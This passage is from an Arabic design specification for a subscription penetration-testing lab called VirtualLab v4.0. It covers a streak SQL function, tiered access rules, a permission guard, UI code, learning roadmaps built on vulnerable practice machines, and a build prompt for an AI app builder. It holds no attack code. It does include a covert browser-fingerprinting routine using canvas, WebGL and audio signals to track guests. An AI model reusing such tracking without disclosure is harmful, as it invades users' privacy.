  
  IF last_date IS NULL THEN
    INSERT INTO user_streaks (user_id, current_streak, longest_streak, last_activity, total_days)
    VALUES (update_user_streak.user_id, 1, 1, CURRENT_DATE, 1);
  ELSIF last_date = CURRENT_DATE THEN
    -- Already counted today
    RETURN;
  ELSIF last_date = CURRENT_DATE - INTERVAL '1 day' THEN
    UPDATE user_streaks SET 
      current_streak = current_streak + 1,
      longest_streak = GREATEST(longest_streak, current_streak + 1),
      last_activity = CURRENT_DATE,
      total_days = total_days + 1
    WHERE user_id = update_user_streak.user_id;
  ELSE
    UPDATE user_streaks SET 
      current_streak = 1,
      last_activity = CURRENT_DATE,
      total_days = total_days + 1
    WHERE user_id = update_user_streak.user_id;
  END IF;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
```

---

## 11. نظام الصلاحيات

### 🔑 المستويات الأربعة:

| الصلاحية | الزائر (بدون حساب) | تجربة (7 أيام) | مشترك | أدمن |
|---------|-----------|---------------|-------|------|
| الوصول للأجهزة | 2 جهاز فقط | كل الأجهزة | كل الأجهزة | كل الأجهزة |
| محاولات/يوم | 3 محاولات | غير محدود | غير محدود | غير محدود |
| AI Helper | 3 رسائل/جلسة | 15 رسالة/يوم | غير محدود | غير محدود |
| تحميل التقارير | ❌ | ❌ | ✅ | ✅ |
| Replay المحفوظ | ❌ | ✅ (محدود) | ✅ كامل | ✅ |
| الشبكات المعقدة | ❌ | ✅ | ✅ | ✅ |
| Attack Chains | ❌ | ✅ (الأول فقط) | ✅ كل الـ 8 | ✅ |
| CTF Events | عرض فقط | مشاركة محدودة | ✅ كامل | ✅ |
| إدارة الأجهزة | ❌ | ❌ | ❌ | ✅ |

### 🛡️ كود فحص الصلاحيات:

```typescript
// /src/lib/lab/permissionGuard.ts

export function canAccessMachine(
  user: User | null,
  subscription: Subscription | null,
  machine: Machine,
  completedIds: Set<string>,
  guestData: GuestData
): { allowed: boolean; reason?: string; ctaAction?: string } {
  
  // أدمن: كل شيء مسموح
  if (user && isAdminEmail(user.email)) {
    return { allowed: true };
  }

  // مشترك فعّال
  if (subscription?.status === "active" && new Date(subscription.expires_at) > new Date()) {
    return { allowed: true };
  }

  // تجربة مجانية 7 أيام
  if (user && subscription?.status === "trial" && new Date(subscription.trial_end) > new Date()) {
    // فحص حد المحاولات اليومي
    if (guestData.attemptsToday >= 15) {
      return { 
        allowed: false, 
        reason: "تجاوزت 15 محاولة اليوم. عُد غداً أو اشترك.",
        ctaAction: "subscribe"
      };
    }
    return { allowed: true };
  }

  // زائر بدون حساب
  if (!user) {
    // فحص بصمة الجهاز
    const fpData = guestData;
    
    // أجهزة مسموحة للزائر فقط (الأبسط)
    const guestAllowedMachines = ["metasploitable2", "dvwa"];
    
    if (!guestAllowedMachines.includes(machine.id)) {
      return {
        allowed: false,
        reason: "هذا الجهاز يتطلب حساباً مجانياً. التسجيل مجاني!",
        ctaAction: "register"
      };
    }
    
    if (fpData.attemptsToday >= 3) {
      return {
        allowed: false,
        reason: "وصلت للحد الأقصى للزوار (3 محاولات). سجّل حساباً مجانياً للحصول على 15 محاولة/يوم لمدة أسبوع.",
        ctaAction: "register"
      };
    }
    
    if (fpData.previouslyVisitedAsGuest && !fpData.hasRegistered) {
      return {
        allowed: false,
        reason: "لقد جربت الموقع كزائر سابقاً. سجّل حساباً للمتابعة (مجاناً 7 أيام).",
        ctaAction: "register"
      };
    }
    
    return { allowed: true };
  }

  // اشتراك منتهي
  return {
    allowed: false,
    reason: "اشتراكك منتهي. جدّد للوصول للمختبر.",
    ctaAction: "renew"
  };
}

// بصمة الجهاز للزوار (منع التحايل)
export async function generateFingerprint(): Promise<string> {
  const data = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screenResolution: `${screen.width}x${screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    canvasFingerprint: await getCanvasFingerprint(),
    webglFingerprint: getWebGLFingerprint(),
    audioFingerprint: await getAudioFingerprint(),
  };
  
  const str = JSON.stringify(data);
  const hash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
  return Array.from(new Uint8Array(hash))
    .map(b => b.toString(16).padStart(2, '0'))
    .join('');
}
```

### 🚦 معالجة "Lock" في UI:

```tsx
// /src/components/lab/MachineCard.tsx

export function MachineCard({ machine, locked, completed, onLaunch }: any) {
  return (
    <div className={`relative bg-[var(--bg-card)] border rounded-xl p-4 transition-all hover:scale-[1.02]
      ${completed ? 'border-green-500/50' : 'border-[var(--border-color)]'}
      ${locked ? 'opacity-70' : ''}
    `}>
      
      {/* ═══ Lock overlay ═══ */}
      {locked && (
        <div className="absolute inset-0 bg-black/40 backdrop-blur-sm rounded-xl flex flex-col items-center justify-center z-10">
          <Lock className="w-12 h-12 text-yellow-500 mb-2" />
          <div className="text-sm font-semibold mb-1">يتطلب اشتراك</div>
          <div className="text-xs opacity-70 text-center px-4">
            هذا الجهاز متاح للمشتركين فقط
          </div>
          <button className="mt-3 px-4 py-1.5 bg-yellow-500 text-black rounded-lg text-sm font-semibold">
            اشترك الآن — 25 ريال / 3 شهور
          </button>
        </div>
      )}

      {/* ═══ Card content ═══ */}
      <div className="flex items-start justify-between mb-3">
        <div>
          <h3 className="font-bold text-base">{machine.name}</h3>
          <div className="text-xs opacity-60 font-mono">{machine.ip}</div>
          <div className="text-xs opacity-60 mt-0.5">{machine.os}</div>
        </div>
        <div className="flex flex-col items-end gap-1">
          <span className="text-xs">{"⭐".repeat(machine.difficultyStars)}</span>
          <span className="text-xs px-2 py-0.5 bg-yellow-500/20 text-yellow-500 rounded-full font-semibold">
            {machine.points} pts
          </span>
        </div>
      </div>

      {/* البورتات */}
      <div className="flex flex-wrap gap-1 mb-3">
        {machine.ports.slice(0, 6).map((p: any) => (
          <span 
            key={p.port}
            className={`text-[10px] px-1.5 py-0.5 rounded font-mono ${
              p.vulnerable ? 'bg-red-500/20 text-red-400' : 'bg-gray-700/30 text-gray-400'
            }`}
          >
            {p.port}/{p.service}
          </span>
        ))}
        {machine.ports.length > 6 && (
          <span className="text-[10px] opacity-50">+{machine.ports.length - 6}</span>
        )}
      </div>

      {/* CVE */}
      {machine.cve && machine.cve.length > 0 && (
        <div className="text-xs mb-3">
          <span className="opacity-60">CVE: </span>
          {machine.cve.slice(0, 2).map((c: string) => (
            <span key={c} className="text-red-400 font-mono mr-1">{c}</span>
          ))}
        </div>
      )}

      {/* Hint */}
      {machine.hint && (
        <div className="text-xs opacity-60 mb-3 italic line-clamp-2">
          💡 {machine.hint}
        </div>
      )}

      {/* Completed badge */}
      {completed && (
        <div className="absolute top-2 right-2 bg-green-500 text-white rounded-full p-1">
          <CheckCircle2 className="w-4 h-4" />
        </div>
      )}

      {/* Action button */}
      <button
        onClick={onLaunch}
        disabled={locked}
        className="w-full py-2 bg-yellow-500 text-black rounded-lg text-sm font-semibold hover:bg-yellow-400 transition-colors disabled:opacity-50"
      >
        {completed ? '🔄 إعادة المحاولة' : '🚀 ابدأ الاختراق'}
      </button>
    </div>
  );
}
```

---

## 12. منهجية التعلم والـ Roadmaps

### 🛣️ الـ 6 Roadmaps الكاملة:

#### Roadmap 1: المبتدئ الكامل (8 أسابيع)
```
الأسبوع 1-2: التأسيس
─────────────────────
☑ Metasploitable 2     (تعلّم nmap + Metasploit أساسي)
☑ DVWA Master          (13 ثغرة web)
☑ Lame                 (تكرار للتمكن)

الأسبوع 3-4: الأساس Linux
────────────────────────
☑ Kioptrix Level 1     (أول CVE حقيقي)
☑ Basic Pentesting 1   (full chain)
☑ Vulnix              (NFS + SMTP)

الأسبوع 5-6: الأساس Web
────────────────────────
☑ Mr. Robot            (WordPress)
☑ HackableII           (file upload)
☑ bWAPP partial        (10 challenges)

الأسبوع 7-8: مشروع نهائي
──────────────────────
☑ Stapler              (تطبيق كل المهارات)
☑ كتابة تقرير احترافي
☑ Daily Challenge x 7  (7 streak)

🎯 الهدف: 1500 نقطة + 8 شارات
```

#### Roadmap 2: مسار الويب الكامل (6 أسابيع)
#### Roadmap 3: مسار Windows + AD (8 أسابيع)
#### Roadmap 4: مسار Buffer Overflow (6 أسابيع)
#### Roadmap 5: مسار Red Team (12 أسبوع)
#### Roadmap 6: مسار Cloud Security (8 أسابيع)

كل roadmap:
- صفحة مخصصة `/lab/roadmap/:id`
- progress bar للأسابيع
- recommended order للأجهزة
- محتوى محاضرات مرتبطة
- نقاط نهاية تأهيلية

---

## 13. إرسال للـ Lovable

```markdown
═════════════════════════════════════════════════════════════
PROMPT FOR LOVABLE — VirtualLab v4.0 PenGuide Cyber Range
═════════════════════════════════════════════════════════════

أضف "المختبر الافتراضي v4.0" على المسار /lab.

# المتطلبات:
1. أضف رابط "المختبر" في الـ navbar (موقعه: ثاني عنصر بعد الرئيسية)
2. الصفحة الرئيسية محمية حسب نظام الصلاحيات (الزائر/التجربة/المشترك/الأدمن)
3. تطبيق Watermark مع بريد المستخدم في كل الصفحات
4. كل البيانات في ملف `/src/data/machines.ts` (32 جهاز)

# جداول قاعدة البيانات (Supabase) — أضف بعد التحقق من عدم وجودها:
- lab_completions
- user_badges  
- daily_challenges
- ctf_events, ctf_submissions
- lab_sessions
- guest_lab_attempts
- user_streaks

# الصفحات:
- /lab                          — الصفحة الرئيسية
- /lab/[machineId]              — صفحة كل جهاز
- /lab/network/[netId]          — شبكة معقدة
- /lab/ctf/[week]               — تحدي أسبوعي
- /lab/walkthrough/[id]         — الشرح الكامل (للمكتمل فقط)
- /lab/roadmap/[id]             — مسار تعلمي
- /lab/leaderboard              — لوحة الترتيب

# المكونات:
كل المكونات في /src/components/lab/
كل types في /src/types/lab/

# تكامل AI:
- زر AI داخل Terminal يفتح شات جانبي مع context كامل
- AI يحصل على: machine info + progress + last 20 terminal lines
- system prompt للمختبر يضاف فوق الـ system prompt العام

# الصلاحيات:
استخدم الكود في /src/lib/lab/permissionGuard.ts بالضبط

# الحماية الأمنية:
- منع نسخ أكثر من 3 أسطر من الـ Terminal output
- منع right-click + Ctrl+A على المحاضرات
- watermark خفي في أي PDF يُحمّل
- بصمة الجهاز للزوار

# UX:
- Themes: Kali / Matrix / Dracula / Solarized / Amber
- Tab autocomplete للأوامر
- Arrow keys للسجل
- Ctrl+L للمسح
- Ctrl+K لفتح AI من أي مكان
- Mobile responsive (Terminal بـ fullscreen mode)

# نظام النقاط:
استخدم POINT_CALCULATION exactly كما في القسم 9
24 شارة كاملة كما في القسم 9

ابن كل ملف كاملاً جاهزاً للنسخ المباشر.
═════════════════════════════════════════════════════════════
```

---

## 📌 ملاحظات نهائية

### ✅ ما تم إنجازه في v4.0 مقارنة بـ v3.0:

| الميزة | v3.0 | v4.0 |
|--------|------|------|
| عدد الأجهزة | 12 | **32** |
| الفئات | 6 | **12** |
| الشبكات المعقدة | 1 | **4** |
| Attack Chains | 0 | **8** |
| الشارات | 7 | **24** |
| النقاط الكلية | 1450 | **8500** |
| CTF أسبوعي | ❌ | ✅ |
| Daily Challenge | ❌ | ✅ |
| Mobile category | ❌ | ✅ |
| Cloud category | ❌ | ✅ |
| Reverse Engineering | ❌ | ✅ |
| Forensics | ❌ | ✅ |
| AI integration | محدود | **كامل** |
| Streak system | ❌ | ✅ |
| Replay system | ❌ | ✅ |
| Leaderboard | ❌ | ✅ |
| Walkthroughs | ❌ | ✅ |
| Roadmaps | ❌ | **6 مسارات** |
| Themes | 4 | **5** |
| Hints system | بسيط | **متدرج** |
| Report generator | ❌ | ✅ |

### 🎯 لماذا VirtualLab v4.0 يغني عن HTB و THM؟

```
✅ المحتوى أوسع: 32 جهاز + 4 شبكات + 8 سيناريوهات = أكثر من 200 ساعة محتوى
✅ بالعربية: المنصة الوحيدة بالعربية الكاملة
✅ AI مدمج: مساعد ذكي يرشد خطوة بخطوة (HTB & THM ليس عندهم هذا)
✅ السعر أقل: 25 ريال / 3 شهور = ~$2/شهر مقابل $14-20 على الآخرين
✅ بدون VPN: كل شيء في المتصفح
✅ على الموبايل: كامل التوافق
✅ منهج عربي: مرتبط بالمحاضرات والشروحات
✅ شهادات داخلية: شارات + leaderboard
✅ دعم بشري + AI: 24/7
```

---

**VirtualLab v4.0 — PenGuide Cyber Range**  
*صنع بحب من قبل عبدالله المسن*  
*© 2026 PenGuide. كل الحقوق محفوظة.*

